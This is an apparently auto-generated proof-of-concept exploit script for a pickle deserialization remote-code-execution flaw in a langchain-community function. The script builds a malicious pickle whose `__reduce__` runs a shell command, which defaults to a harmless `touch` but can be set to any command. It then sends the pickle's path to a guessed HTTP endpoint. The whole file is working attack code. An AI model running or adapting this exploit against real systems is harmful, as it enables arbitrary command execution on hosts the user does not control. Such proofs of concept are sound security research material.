#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-018
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_if_string_opens_calls__send_pipeline_to_device.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: Unsafe pickle.load() in _send_pipeline_to_device() when
the 'pipeline' parameter is a string (file path). An attacker can supply
a path to a malicious pickle file, leading to arbitrary code execution.

This PoC:
1. Creates a malicious pickle file that executes a benign command
2. Hosts it temporarily (or writes it to a known location)
3. Triggers the vulnerable function with the path to the malicious pickle
"""

import os
import sys
import pickle
import tempfile
import argparse
import requests
import subprocess
from typing import Optional

# =============================================================================
# Configuration
# =============================================================================
TARGET_URL = "http://localhost:8000/api/v1/trigger"  # Default target
BENIGN_CMD = "touch /tmp/poc_success.txt"  # Safe payload for verification


# =============================================================================
# Malicious pickle payload generator
# =============================================================================
class MaliciousPickle:
    """Class that executes a command when unpickled."""
    def __reduce__(self):
        # Return a tuple (callable, args) - subprocess.call will be invoked
        return (subprocess.call, (["sh", "-c", BENIGN_CMD],))


def create_malicious_pickle(output_path: str, command: Optional[str] = None) -> str:
    """
    Create a malicious pickle file that executes a command when loaded.
    
    Args:
        output_path: Path where the pickle file will be written
        command: Command to execute (default: BENIGN_CMD)
    
    Returns:
        Path to the created pickle file
    """
    if command:
        global BENIGN_CMD
        BENIGN_CMD = command
    
    payload = MaliciousPickle()
    with open(output_path, "wb") as f:
        pickle.dump(payload, f)
    
    print(f"[+] Created malicious pickle file at: {output_path}")
    print(f"[+] Payload command: {BENIGN_CMD}")
    return output_path


# =============================================================================
# Exploit execution
# =============================================================================
def exploit(target_url: str, pickle_path: str) -> bool:
    """
    Send the malicious pickle path to the vulnerable endpoint.
    
    Args:
        target_url: The vulnerable endpoint URL
        pickle_path: Path to the malicious pickle file
    
    Returns:
        True if exploitation appears successful, False otherwise
    """
    print(f"[*] Sending malicious pickle path to {target_url}")
    print(f"[*] Pickle path: {pickle_path}")
    
    try:
        # The vulnerable function expects the 'pipeline' parameter as a string
        # (file path). We send it as a POST parameter.
        response = requests.post(
            target_url,
            json={"pipeline": pickle_path},
            timeout=10
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if the command was executed (for benign payload)
        if BENIGN_CMD.startswith("touch"):
            marker_file = BENIGN_CMD.split()[-1]
            if os.path.exists(marker_file):
                print(f"[+] SUCCESS: Marker file '{marker_file}' was created!")
                print(f"[+] Command execution confirmed!")
                return True
            else:
                print(f"[-] Marker file not found. Command may not have executed.")
                print(f"[-] Check if the target is reachable and the endpoint exists.")
                return False
        
        return True
        
    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print(f"[-] Is the target server running?")
        return False
    except requests.exceptions.Timeout:
        print(f"[-] Timeout: Request to {target_url} timed out")
        return False
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        return False


# =============================================================================
# Main
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only pickle deserialization RCE"
    )
    parser.add_argument(
        "-t", "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "-c", "--command",
        default=BENIGN_CMD,
        help=f"Command to execute (default: '{BENIGN_CMD}')"
    )
    parser.add_argument(
        "-p", "--pickle-path",
        help="Path to existing malicious pickle file (creates one if not provided)"
    )
    
    args = parser.parse_args()
    
    # Create or use existing malicious pickle
    if args.pickle_path and os.path.exists(args.pickle_path):
        pickle_path = args.pickle_path
        print(f"[*] Using existing pickle file: {pickle_path}")
    else:
        # Create a temporary pickle file
        with tempfile.NamedTemporaryFile(suffix=".pkl", delete=False) as tmp:
            pickle_path = tmp.name
        create_malicious_pickle(pickle_path, args.command)
    
    try:
        # Execute the exploit
        success = exploit(args.target, pickle_path)
        
        if success:
            print("\n[+] Exploit completed successfully!")
            print(f"[+] The command '{args.command}' should have been executed.")
        else:
            print("\n[-] Exploit may have failed. Check the output above.")
            print("[-] Possible reasons:")
            print("  - Target server is not running")
            print("  - Endpoint path is different")
            print("  - Input parameter name is different")
            print("  - Network/firewall blocking the request")
    
    finally:
        # Clean up the temporary pickle file
        if not args.pickle_path and os.path.exists(pickle_path):
            os.unlink(pickle_path)
            print(f"[*] Cleaned up temporary pickle file: {pickle_path}")


if __name__ == "__main__":
    main()
